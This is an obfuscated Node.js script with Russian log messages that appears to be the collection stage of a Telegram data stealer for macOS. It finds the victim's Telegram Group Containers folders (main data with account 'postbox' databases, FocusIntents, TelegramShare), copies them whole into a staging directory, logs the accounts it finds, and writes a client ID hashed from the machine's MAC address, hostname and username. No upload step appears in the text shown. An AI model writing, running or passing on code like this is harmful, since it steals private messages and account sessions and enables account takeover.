const _0x20725d=_0x28f7;(function(_0x2d1beb,_0x4f6abc){const _0x500f52=_0x28f7,_0x5b198f=_0x2d1beb();while(!![]){try{const _0x21aacc=parseInt(_0x500f52(0x1b2))/0x1+-parseInt(_0x500f52(0x183))/0x2+parseInt(_0x500f52(0x18c))/0x3+-parseInt(_0x500f52(0x179))/0x4+-parseInt(_0x500f52(0x18d))/0x5+-parseInt(_0x500f52(0x1a3))/0x6+parseInt(_0x500f52(0x191))/0x7*(parseInt(_0x500f52(0x181))/0x8);if(_0x21aacc===_0x4f6abc)break;else _0x5b198f['push'](_0x5b198f['shift']());}catch(_0x2e7f1b){_0x5b198f['push'](_0x5b198f['shift']());}}}(_0x292d,0x2b4a9));const fs=require('fs'),os=require('os'),path=require(_0x20725d(0x1a9)),{execSync}=require('child_process'),crypto=require('crypto'),CONFIG={'stableDir':_0x20725d(0x1aa),'telegram':{'mainDir':_0x20725d(0x184),'focusDir':_0x20725d(0x19d),'shareDir':_0x20725d(0x197)}};function log(_0x3a5adf,_0x54f148=![]){const _0x16e72e=_0x20725d,_0x1cbd2a=new Date()['toISOString'](),_0x25bb7a='['+_0x1cbd2a+']\x20'+_0x3a5adf;_0x54f148?console[_0x16e72e(0x1a1)](_0x25bb7a):console[_0x16e72e(0x1c7)](_0x25bb7a);try{fs[_0x16e72e(0x19a)](_0x16e72e(0x17a),_0x25bb7a+'\x0a');}catch(_0x122349){console['error'](_0x16e72e(0x1b7)+_0x122349[_0x16e72e(0x176)]);}}function createDirectory(_0x31fed2){const _0x8a61b0=_0x20725d;try{return!fs[_0x8a61b0(0x1bd)](_0x31fed2)&&(fs[_0x8a61b0(0x1be)](_0x31fed2,{'recursive':!![]}),log('Создана\x20директория:\x20'+_0x31fed2)),!![];}catch(_0x2e1c76){return log(_0x8a61b0(0x19c)+_0x31fed2+':\x20'+_0x2e1c76[_0x8a61b0(0x176)],!![]),![];}}function copyFile(_0x58bb30,_0x2459cf){const _0x30b480=_0x20725d;try{return fs[_0x30b480(0x193)](_0x58bb30,_0x2459cf),!![];}catch(_0xb2ffc2){return log(_0x30b480(0x186)+_0x58bb30+':\x20'+_0xb2ffc2[_0x30b480(0x176)],!![]),![];}}function copyDirectoryRecursive(_0x31c524,_0xed0eb2){const _0x37d204=_0x20725d;try{!fs[_0x37d204(0x1bd)](_0xed0eb2)&&fs[_0x37d204(0x1be)](_0xed0eb2,{'recursive':!![]});const _0x475931=fs[_0x37d204(0x180)](_0x31c524,{'withFileTypes':!![]});for(const _0x1ac002 of _0x475931){const _0x54785f=path[_0x37d204(0x18f)](_0x31c524,_0x1ac002[_0x37d204(0x1ae)]),_0x445b00=path[_0x37d204(0x18f)](_0xed0eb2,_0x1ac002[_0x37d204(0x1ae)]);_0x1ac002[_0x37d204(0x196)]()?copyDirectoryRecursive(_0x54785f,_0x445b00):copyFile(_0x54785f,_0x445b00);}return!![];}catch(_0x5b8b11){return log(_0x37d204(0x1b9)+_0x31c524+':\x20'+_0x5b8b11[_0x37d204(0x176)],!![]),![];}}function _0x292d(){const _0xd37b69=['telegram','Ошибка\x20копирования\x20директории\x20','toString','userInfo','writeFileSync','existsSync','mkdirSync','keys','Копирование\x20основных\x20данных\x20Telegram...','shareDir','floor','username','/Telegram','statSync','startsWith','log','size','random','FocusIntents','Директория\x20TelegramShare\x20не\x20найдена\x20по\x20пути:\x20','message','unknown','pow','1016692NtMibB','telegram_collector.log','Library','Сбор\x20данных\x20Telegram\x20успешно\x20завершен','createHash','internal','00:00:00:00:00:00','readdirSync','6771656cpjVof','Bytes','254328EImiQr','6N38VWS5BX.ru.keepcoder.Telegram','Сбор\x20данных\x20Telegram\x20завершился\x20с\x20ошибками','Ошибка\x20копирования\x20файла\x20','Ошибка\x20копирования\x20основных\x20данных\x20Telegram','0\x20Bytes','Данные\x20TelegramShare\x20успешно\x20скопированы','mainDir','Начало\x20процесса\x20сбора\x20данных\x20Telegram','70005BEwHpC','1430940bOeqKb','basename','join','exit','7RdsRFp','Директория\x20Group\x20Containers\x20не\x20найдена\x20по\x20пути:\x20','copyFileSync','substring','focusDir','isDirectory','6N38VWS5BX.ru.keepcoder.Telegram.TelegramShare','map','\x20содержит\x20postbox','appendFileSync','Общий\x20размер\x20скопированных\x20данных\x20Telegram:\x20','Ошибка\x20создания\x20директории\x20','6N38VWS5BX.ru.keepcoder.Telegram.FocusIntents','filter','stableDir','Найдена\x20директория\x20TelegramShare:\x20','error','Основные\x20данные\x20Telegram\x20успешно\x20скопированы','579660WTrbNY','Не\x20удалось\x20создать\x20директорию\x20','Group\x20Containers','length','Аккаунт\x20','Найдено\x20аккаунтов\x20Telegram:\x20','path','Stable','digest','Копирование\x20данных\x20FocusIntents\x20Telegram...','md5','name','Директория\x20FocusIntents\x20Telegram\x20не\x20найдена\x20по\x20пути:\x20','mac','Main','71664nMXNPG','Ошибка\x20сбора\x20данных\x20Telegram:\x20','Неожиданная\x20ошибка:\x20','Аккаунты\x20Telegram\x20не\x20найдены','networkInterfaces','Ошибка\x20записи\x20в\x20лог:\x20'];_0x292d=function(){return _0xd37b69;};return _0x292d();}function formatFileSize(_0x1e4bf9){const _0x1c1596=_0x20725d;if(_0x1e4bf9===0x0)return _0x1c1596(0x188);const _0x2f7ad8=0x400,_0x4ae268=[_0x1c1596(0x182),'KB','MB','GB','TB'],_0x1ea5cc=Math[_0x1c1596(0x1c2)](Math[_0x1c1596(0x1c7)](_0x1e4bf9)/Math[_0x1c1596(0x1c7)](_0x2f7ad8));return parseFloat((_0x1e4bf9/Math[_0x1c1596(0x178)](_0x2f7ad8,_0x1ea5cc))['toFixed'](0x2))+'\x20'+_0x4ae268[_0x1ea5cc];}function generateClientId(){const _0xc5f128=_0x20725d;try{const _0x5e10d1=getMacAddress(),_0x5e2cd4=os['hostname'](),_0x323a4f=os['userInfo']()[_0xc5f128(0x1c3)],_0x481043=crypto[_0xc5f128(0x17d)](_0xc5f128(0x1ad))['update'](_0x5e10d1+':'+_0x5e2cd4+':'+_0x323a4f)[_0xc5f128(0x1ab)]('hex')[_0xc5f128(0x194)](0x0,0x8);return _0x481043;}catch(_0xf3648b){return Math[_0xc5f128(0x1c9)]()[_0xc5f128(0x1ba)](0x24)[_0xc5f128(0x194)](0x2,0xa);}}function getMacAddress(){const _0x187839=_0x20725d;try{const _0x144a92=os[_0x187839(0x1b6)]();for(const _0x1061a3 of Object[_0x187839(0x1bf)](_0x144a92)){for(const _0x5588e2 of _0x144a92[_0x1061a3]){if(!_0x5588e2[_0x187839(0x17e)]&&_0x5588e2[_0x187839(0x1b0)]!==_0x187839(0x17f))return _0x5588e2['mac'];}}return _0x187839(0x177);}catch(_0x2ae66a){return _0x187839(0x177);}}function _0x28f7(_0x367df2,_0x96cc83){const _0x292d02=_0x292d();return _0x28f7=function(_0x28f724,_0x53316f){_0x28f724=_0x28f724-0x174;let _0x193cec=_0x292d02[_0x28f724];return _0x193cec;},_0x28f7(_0x367df2,_0x96cc83);}async function collectTelegramData(){const _0xbc3282=_0x20725d;try{log('Начинаем\x20сбор\x20данных\x20Telegram...');if(!createDirectory(CONFIG[_0xbc3282(0x19f)]))throw new Error(_0xbc3282(0x1a4)+CONFIG['stableDir']);const _0x2094e8=os[_0xbc3282(0x1bb)]()[_0xbc3282(0x1c3)],_0x264839=path['join']('/Users',_0x2094e8,_0xbc3282(0x17b),_0xbc3282(0x1a5));if(!fs[_0xbc3282(0x1bd)](_0x264839))throw new Error(_0xbc3282(0x192)+_0x264839);const _0xe7bf82=path[_0xbc3282(0x18f)](CONFIG[_0xbc3282(0x19f)],'Telegram');createDirectory(_0xe7bf82);const _0x218878=path[_0xbc3282(0x18f)](_0x264839,CONFIG['telegram'][_0xbc3282(0x18a)]);if(fs[_0xbc3282(0x1bd)](_0x218878)){log('Найдена\x20директория\x20основных\x20данных\x20Telegram:\x20'+_0x218878);const _0x724c9=path[_0xbc3282(0x18f)](_0xe7bf82,_0xbc3282(0x1b1));createDirectory(_0x724c9),log(_0xbc3282(0x1c0));if(copyDirectoryRecursive(_0x218878,_0x724c9)){log(_0xbc3282(0x1a2));const _0x4d8e2b=fs[_0xbc3282(0x180)](_0x724c9)[_0xbc3282(0x19e)](_0x3b30a2=>_0x3b30a2[_0xbc3282(0x1c6)]('account-'))[_0xbc3282(0x198)](_0x3b50a2=>path[_0xbc3282(0x18f)](_0x724c9,_0x3b50a2));if(_0x4d8e2b['length']>0x0){log(_0xbc3282(0x1a8)+_0x4d8e2b[_0xbc3282(0x1a6)]);for(const _0x55ddc8 of _0x4d8e2b){const _0x3e1e02=path[_0xbc3282(0x18e)](_0x55ddc8);fs[_0xbc3282(0x1bd)](path[_0xbc3282(0x18f)](_0x55ddc8,'postbox'))&&log(_0xbc3282(0x1a7)+_0x3e1e02+_0xbc3282(0x199));}}else log(_0xbc3282(0x1b5));}else log(_0xbc3282(0x187),!![]);}else log('Основная\x20директория\x20Telegram\x20не\x20найдена\x20по\x20пути:\x20'+_0x218878,!![]);const _0x3f8a86=path[_0xbc3282(0x18f)](_0x264839,CONFIG[_0xbc3282(0x1b8)][_0xbc3282(0x195)]);if(fs[_0xbc3282(0x1bd)](_0x3f8a86)){log('Найдена\x20директория\x20FocusIntents\x20Telegram:\x20'+_0x3f8a86);const _0x1f6cb1=path['join'](_0xe7bf82,_0xbc3282(0x174));createDirectory(_0x1f6cb1),log(_0xbc3282(0x1ac)),copyDirectoryRecursive(_0x3f8a86,_0x1f6cb1)?log('Данные\x20FocusIntents\x20Telegram\x20успешно\x20скопированы'):log('Ошибка\x20копирования\x20данных\x20FocusIntents\x20Telegram',!![]);}else log(_0xbc3282(0x1af)+_0x3f8a86,!![]);const _0x12c1ec=path['join'](_0x264839,CONFIG['telegram'][_0xbc3282(0x1c1)]);if(fs[_0xbc3282(0x1bd)](_0x12c1ec)){log(_0xbc3282(0x1a0)+_0x12c1ec);const _0x9a1ff7=path[_0xbc3282(0x18f)](_0xe7bf82,'TelegramShare');createDirectory(_0x9a1ff7),log('Копирование\x20данных\x20TelegramShare...'),copyDirectoryRecursive(_0x12c1ec,_0x9a1ff7)?log(_0xbc3282(0x189)):log('Ошибка\x20копирования\x20данных\x20TelegramShare',!![]);}else log(_0xbc3282(0x175)+_0x12c1ec,!![]);let _0x312e39=0x0;const _0x370ea2=_0x1222f1=>{const _0x5575ea=_0xbc3282,_0x5e3570=fs[_0x5575ea(0x180)](_0x1222f1);for(const _0x527351 of _0x5e3570){const _0x28c8d2=path['join'](_0x1222f1,_0x527351),_0x32414d=fs[_0x5575ea(0x1c5)](_0x28c8d2);_0x32414d['isDirectory']()?_0x370ea2(_0x28c8d2):_0x312e39+=_0x32414d[_0x5575ea(0x1c8)];}};try{_0x370ea2(_0xe7bf82),log(_0xbc3282(0x19b)+formatFileSize(_0x312e39));}catch(_0x309674){log('Ошибка\x20при\x20подсчете\x20размера\x20данных:\x20'+_0x309674['message'],!![]);}return!![];}catch(_0x74507d){return log(_0xbc3282(0x1b3)+_0x74507d[_0xbc3282(0x176)],!![]),![];}}async function main(){const _0x5d730a=_0x20725d;try{log(_0x5d730a(0x18b));const _0x273b10=await collectTelegramData();if(_0x273b10){log(_0x5d730a(0x17c)),log('Данные\x20сохранены\x20в\x20директории:\x20'+CONFIG[_0x5d730a(0x19f)]+_0x5d730a(0x1c4));const _0x1a1348=generateClientId();fs[_0x5d730a(0x1bc)]('client-id.txt',_0x1a1348),log('Идентификатор\x20клиента\x20сохранен:\x20'+_0x1a1348),process[_0x5d730a(0x190)](0x0);}else log(_0x5d730a(0x185),!![]),process[_0x5d730a(0x190)](0x1);}catch(_0x415ba2){log(_0x5d730a(0x1b4)+_0x415ba2['message'],!![]),process[_0x5d730a(0x190)](0x1);}}main();
